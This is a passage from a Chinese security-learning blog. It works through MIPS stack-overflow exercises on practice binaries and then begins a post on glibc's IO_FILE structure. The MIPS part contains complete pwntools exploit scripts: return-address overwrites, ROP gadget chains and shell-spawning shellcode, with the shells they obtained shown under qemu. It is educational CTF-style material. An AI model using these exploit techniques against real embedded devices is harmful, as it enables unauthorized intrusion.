class="line">.text:004004D0                 addiu   $sp, 0x20</span><br><span class="line">.text:004004D4                 jr      $ra</span><br><span class="line">.text:004004D8                 nop</span><br></pre></td></tr></table></figure>

<p>刚进入main函数就对$sp进行了操作，这个$sp对应x86的rsp，储存着栈底的地址，第一条指令的操作就是开辟main函数的栈帧，由于main是非叶子函数所以得把$ra压入栈，第二条指令就是执行这个操作，当main函数指令完主要部分后就会执行<code>lw      $ra, 0x20+var_4($sp)</code>指令，这个指令就是把返回地址存入$ra中，最后<code>jr      $ra</code>进行跳转。</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序中对输入值没有限制就直接放入has_stack函数的栈中，而has_stack函数又是非叶子函数，栈中储存着返回地址，只要确定输入的地址和储存返回地址的地址的差值就可以对返回地址进行准确覆盖了，可以直接通过ida确定，也可以让程序跑起来再确定</p>
<h2 id="尝试攻击（确定填充量）"><a href="#尝试攻击（确定填充量）" class="headerlink" title="尝试攻击（确定填充量）"></a>尝试攻击（确定填充量）</h2><p>运行加调试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">qemu-misepl -g 1234 ./vuln <span class="string">&quot;aaaaa&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">gdb-multiarch ./vuln</span></span><br><span class="line"><span class="meta">#</span><span class="bash">target remote:1234</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>程序就开始运行并调试起来了</p>
<p>调试效果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">08:0020│    0x76ffef60 ◂— &#x27;aaaaaaaa&#x27;</span><br><span class="line">09:0024│    0x76ffef64 ◂— &#x27;aaaa&#x27;</span><br><span class="line">0a:0028│ v1 0x76ffef68 ◂— 0</span><br><span class="line">0b:002c│    0x76ffef6c ◂— 0</span><br><span class="line">0c:0030│    0x76ffef70 —▸ 0x76ffef78 —▸ 0x76fff283 ◂— &#x27;aaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">0d:0034│    0x76ffef74 —▸ 0x4004c0 (main+48) ◂— 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可见buf和ra之间差28个字节</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel vuln `python -c &quot;print &#x27;a&#x27;*28+&#x27;\xb4\x03\x40\x00&#x27;&quot;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">拿到shell</span><br><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell/stady$ qemu-mipsel vuln `python -c &quot;print &#x27;a&#x27;*28+&#x27;\xb4\x03\x40\x00&#x27;&quot;`</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">core  pwnc.py  vuln  vuln.id0  vuln.id1  vuln.nam  vuln.til</span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>

<h2 id="举例二"><a href="#举例二" class="headerlink" title="举例二"></a>举例二</h2><p>源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> filelen=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>==stat(<span class="string">&quot;passwd&quot;</span>,&amp;fileData))</span><br><span class="line">&#123;</span><br><span class="line">filelen=fileData.st_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((fp=fopen(<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;rb&quot;</span>))==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cannot open file passwd!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">ch=fgetc(fp);</span><br><span class="line"><span class="keyword">while</span>(count&lt;=filelen)</span><br><span class="line">&#123;</span><br><span class="line">buf[count++]=ch;</span><br><span class="line">ch=fgetc(fp);</span><br><span class="line">&#125;</span><br><span class="line">buf[--count]=<span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf,<span class="string">&quot;adminpwd&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">do_system(count,<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;you have an invalid password!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>会打开本地的passwd文件，不对文件内容做限制直接放进buf中，而main又是非叶子函数，返回地址保存在栈中，可以直接覆盖返回地址为后门函数的地址，但是后门函数里system的参数不是固定的，是后门函数的第二个参数，第二个参数的用寄存器$a1储存，所以得在调用前对$a1赋值才行，在x86里面都是用gadget完成参数构造，在mips里面也是，不过这次是用ida查找gadget</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.stackfinder()----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x00401F90  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x58+var_40                           |  jr    0x58+var_4(<span class="variable">$sp</span>)                 |----------------------------------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>这个gadget的地址是0x00401F90,通过其汇编可知可以通过栈来对$a1进行赋值，然后再 jr    0x58+var_4($sp) ，所以只要在对应位置填充对应值就行了。</p>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>本来打算把这个拖进ida直接看偏移量的，结果发现他反汇编出来的代码和源代码也相差太大了，于是放弃ida直接通过运行确定偏移量。</p>
<p>找到buf地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> 08:0020│  0x76ffedf8 ◂— 0x3c /* <span class="string">&#x27;&lt;&#x27;</span> */09:0024│  0x76ffedfc —▸ 0x425908 ◂— move   <span class="variable">$t4</span>, <span class="variable">$zero</span> /* 0x6025; <span class="string">&#x27;%`&#x27;</span> */... ↓     2 skipped0c:0030│  0x76ffee08 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)... ↓     3 skippedpwndbg&gt; 10:0040│  0x76ffee18 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span></span><br></pre></td></tr></table></figure>

<p>储存返回地址的地址是0x76ffedd8+0x1cc，算出</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offest=0x76ffedd8+0x1cc-0x76ffee08=0x19c</span><br></pre></td></tr></table></figure>

<p>可以得到payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#x27;a&#x27;*0x19c+p32(gadget_addr)+&#x27;a&#x27;*0x18+&#x27;/bin/sh\x00&#x27;payload=payload.ljust(0x1a0+0x54,&#x27;a&#x27;)payload=payload+p32(dock_addr)</span><br></pre></td></tr></table></figure>

<p>最终脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *gadget_addr=0x00401F90dock_addr=<span class="number">0x004003B0f</span>=<span class="built_in">open</span>(<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;wb&quot;</span>)payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x19c</span>+p32(gadget_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;/bin/sh\x00&#x27;</span>payload=payload.ljust(<span class="number">0x1a0</span>+<span class="number">0x54</span>,<span class="string">&#x27;a&#x27;</span>)payload=payload+p32(dock_addr)f.write(payload)f.close()</span><br></pre></td></tr></table></figure>

<p>得到shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell/stady1$ qemu-mipsel ./vulnyou have an invalid password!$ lscore  passwd  pwnc.py  vuln  vuln.c  vuln.id0  vuln.id1  vuln.nam  vuln.til</span><br></pre></td></tr></table></figure>

<p>总结：gdb-multiarch调试的时候好像不能b+函数名，不然抓不到，得确切的地址才可以。</p>
<h2 id="举例三-HWX-mipspwn入门题"><a href="#举例三-HWX-mipspwn入门题" class="headerlink" title="举例三 HWX mipspwn入门题"></a>举例三 HWX mipspwn入门题</h2><p>知识补充：mips一般都是堆栈可执行的，所以只要向堆栈中放入shellcode，然后利用返回地址跳到shellcode就行了（泄露栈地址），</p>
<p>源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;  <span class="keyword">int</span> v3; <span class="comment">// $a2  int v5; // [sp+18h] [+18h]  setbuf(stdin, 0, envp);  setbuf(stdout, 0, v3);  printf(&quot;\x1B[33m&quot;);  puts(&quot;-----we1c0me t0 MP l0g1n s7stem-----&quot;);  v5 = sub_400840();  sub_400978(v5);  printf(&quot;\x1B[32m&quot;);  return puts(&quot;Now you getshell~&quot;);&#125;int sub_400840()&#123;  char v1[24]; // [sp+18h] [+18h] BYREF  memset(v1, 0, sizeof(v1));  printf(&quot;\x1B[34m&quot;);  printf(&quot;Username : &quot;);  read(0, v1, 24);  if ( strncmp(v1, &quot;admin&quot;, 5) )    exit(0);  printf(&quot;Correct name : %s&quot;, v1);  return strlen(v1);&#125;int __fastcall sub_400978(int a1)&#123;  char v2[20]; // [sp+18h] [+18h] BYREF  int v3; // [sp+2Ch] [+2Ch]  char v4[36]; // [sp+3Ch] [+3Ch] BYREF  v3 = a1 + 4;  printf(&quot;\x1B[31m&quot;);  printf(&quot;Pre_Password : &quot;);  read(0, v2, 36);  printf(&quot;Password : &quot;);  read(0, v4, v3);  if ( strncmp(v2, &quot;access&quot;, 6) || strncmp(v4, &quot;0123456789&quot;, 10) )    exit(0);  return puts(&quot;Correct password : **********&quot;);&#125;</span></span><br></pre></td></tr></table></figure>

<p>这道题漏洞比较明显，第一个函数泄露栈地址，第二个函数泄露填充shellocde然后调到这执行就行。</p>
<p>按道理来说这样就行了，把buf填满就能泄露处栈地址了，但是我发现我的栈地址最后是0x00,导致%s输出的时候会截断，然后我重试了很多次，发现栈地址最后都是0x00,最后破案了，我的qemu-mipsel没有开aslr,所以栈地址一直都是固定的，百度谷歌一顿查都说qemu的aslr默认关闭，但是没人告诉我怎么开，哎，那就当我泄露出来了继续做吧（反正栈地址不变）。</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>)io = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])<span class="comment">#io = process([&quot;qemu-mipsel&quot;,&#x27;-g&#x27;,&#x27;1234&#x27;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])io.sendafter(&quot;name : &quot;,&quot;admin&quot;.ljust(0x18,&#x27;a&#x27;))io.recvuntil(&quot;Correct name : &quot;);sp=0x76fff000io.sendafter(&#x27;Pre_Password : &#x27;,&quot;access&quot;.ljust(20,&#x27;a&#x27;)+p32(0x100))io.sendafter(&#x27;Password : &#x27;,&#x27;0123456789&#x27;.ljust(0x28,&#x27;a&#x27;)+p32(sp)+asm(shellcraft.sh()))io.interactive()</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell/HWS/pwn1/Mplogin/Mplogin$ python pwnc.py[+] Starting local process &#x27;/usr/bin/qemu-mipsel&#x27;: pid 16096[*] Switching to interactive modeCorrect password : **********$ lscore  lib  pwn    pwnc.py  qemu_pwn_20220117-133618_15898.core</span><br></pre></td></tr></table></figure>

<h2 id="举例三-HWX-mipspwn入门题二"><a href="#举例三-HWX-mipspwn入门题二" class="headerlink" title="举例三 HWX mipspwn入门题二"></a>举例三 HWX mipspwn入门题二</h2><p>这道题是mips大端程序，不知道为啥我的gdb-multiarch老是爆段错误，查了好半天也没查出来啥问题，我看别人调试mips大端也是我这样调试的啊，奇了怪了，本来想通过调试找到到ra的偏移量的，不过一个一个输也能找见，那就这样把，别的师傅找到离ra的偏移量是0x90，直接拿来用就行（mips环境好司马）</p>
<p>这道题和上道题有些像又有些不像，两道题都是直接shellcode,不过上道题直接shellcode的地址，这道题不知道，只知道shellcode离sp的偏移量，就不能直接通过ra直接跳到shellcode执行了，得通过gadget间接跳转到这里才行</p>
<p>ida的mipsrop</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.stackfinder()----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x004273C4  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0x98+var_34                           |  jalr  <span class="variable">$s0</span>                             ||  0x0042BCD0  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0xB0+var_34                           |  jalr  <span class="variable">$s2</span>                             ||  0x0042FA00  |  addiu <span class="variable">$v1</span>,<span class="variable">$sp</span>,0x160+var_12C                         |  jalr  <span class="variable">$s1</span>                             ||  0x004491F8  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0x60+var_28                           |  jalr  <span class="variable">$s1</span>                             ||  0x0044931C  |  addiu <span class="variable">$v0</span>,<span class="variable">$sp</span>,0x48+var_20                           |  jalr  <span class="variable">$s1</span>                             ||  0x00449444  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0x60+var_28                           |  jalr  <span class="variable">$s1</span>                             ||  0x0044AD58  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x78+var_40                           |  jalr  <span class="variable">$s4</span>                             ||  0x0044AEFC  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x80+var_44                           |  jalr  <span class="variable">$s5</span>                             ||  0x0044B154  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x80+var_4C                           |  jalr  <span class="variable">$s2</span>                             ||  0x0044B1EC  |  addiu <span class="variable">$v0</span>,<span class="variable">$sp</span>,0x80+var_54                           |  jalr  <span class="variable">$s2</span>                             ||  0x0044B3EC  |  addiu <span class="variable">$v0</span>,<span class="variable">$sp</span>,0x198+var_158                         |  jalr  <span class="variable">$s0</span>                             ||  0x00454E94  |  addiu <span class="variable">$s7</span>,<span class="variable">$sp</span>,0xE0+var_C0                           |  jalr  <span class="variable">$s3</span>                             ||  0x00465BEC  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0xE8+var_BC                           |  jalr  <span class="variable">$s0</span>                             |----------------------------------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>这些都是程序自带的gadget了</p>
<p>程序最后是这样处理s寄存器的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move    $sp, $fp.text:00400A30                 lw      $ra, 0x58+var_s24($sp).text:00400A34                 lw      $fp, 0x58+var_s20($sp).text:00400A38                 lw      $s7, 0x58+var_s1C($sp).text:00400A3C                 lw      $s6, 0x58+var_s18($sp).text:00400A40                 lw      $s5, 0x58+var_s14($sp).text:00400A44                 lw      $s4, 0x58+var_s10($sp).text:00400A48                 lw      $s3, 0x58+var_sC($sp).text:00400A4C                 lw      $s2, 0x58+var_s8($sp).text:00400A50                 lw      $s1, 0x58+var_s4($sp).text:00400A54                 lw      $s0, 0x58+var_s0($sp).text:00400A58                 addiu   $sp, 0x80.text:00400A5C                 jr      $ra.text:00400A60                 nop.text:00400A60  # End of function pwn</span><br></pre></td></tr></table></figure>

<p>这些地方都可以溢出到，所以可以控制s0-s7的寄存器的值，那前面的那些gadget都能拿来用，我们直接使用第一个。</p>
<p>把shellcode存在$sp,0x98+var_34上，然后把ra覆盖成第一个gadget的地址，那就会把shellcode的地址给$a2,然后跳转到$s0执行代码，$s0是可控的，我们还可以填充一个跳转到$s2的gadget，最后就顺利执行shellcode代码了。</p>
<p>那怎么找第二个gadget呢，在mips中一般是通过$t9完成间接跳转的，可以在ida中这样搜索gadget</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.find(<span class="string">&quot;move <span class="variable">$t9</span>,<span class="variable">$a2</span>&quot;</span>)----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x00421684  |  move <span class="variable">$t9</span>,<span class="variable">$a2</span>                                        |  jr    <span class="variable">$a2</span>                             |----------------------------------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>这个gadget的意思是把$a2的值赋值给$t9，然后跳转到$a2执行代码。</p>
<p>思路滤好了，就可以开始着手写代码了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)io = process([<span class="string">&quot;qemu-mips&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])io.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)ra = <span class="number">0x004273C4</span> <span class="comment"># move sp+0x64 to a2 -&gt; jmp s0s0 = 0x00421684 # jmp a2                   payload = &#x27;1:&#x27;payload += &#x27;a&#x27;*0x6c + p32(s0) + &#x27;a&#x27;*0x20 + p32(ra)payload += &#x27;a&#x27;*0x64 + asm(shellcraft.sh())io.sendlineafter(&quot;Job.&#x27;&quot;,payload)io.interactive()</span></span><br></pre></td></tr></table></figure>

<h2 id="总结：mips一般通过shellcode得到shell-跳转到shellcode不是知道地址直接跳就是通过几个gadget跳。能泄露栈地址就选第一个，不能泄露就选第二个。"><a href="#总结：mips一般通过shellcode得到shell-跳转到shellcode不是知道地址直接跳就是通过几个gadget跳。能泄露栈地址就选第一个，不能泄露就选第二个。" class="headerlink" title="总结：mips一般通过shellcode得到shell,跳转到shellcode不是知道地址直接跳就是通过几个gadget跳。能泄露栈地址就选第一个，不能泄露就选第二个。"></a>总结：mips一般通过shellcode得到shell,跳转到shellcode不是知道地址直接跳就是通过几个gadget跳。能泄露栈地址就选第一个，不能泄露就选第二个。</h2><p>最近mips给我整恶心了🤢，打算放mips先不搞mips了，先去复现一些x86的题目了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/11/io-file%E4%B9%8Bstdout/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/11/io-file%E4%B9%8Bstdout/" class="post-title-link" itemprop="url">io_file之stdout</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-11 22:19:37 / 修改时间：22:20:01" itemprop="dateCreated datePublished" datetime="2022-01-11T22:19:37+08:00">2022-01-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="IO-file学习-基于2-23源码学习"><a href="#IO-file学习-基于2-23源码学习" class="headerlink" title="IO_file学习(基于2.23源码学习)"></a>IO_file学习(基于2.23源码学习)</h1><p>io_file是一个描述有关io操作的文件结构体，当有输出和输出函数时会用到这个结构体，其代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>结构体一共有两个变量，file和vtable,其中file记录着一些数据，vtable储存着各种各样的函数指针，也叫虚表</p>
<h2 id="file源代码"><a href="#file源代码" class="headerlink" title="file源代码"></a>file源代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> 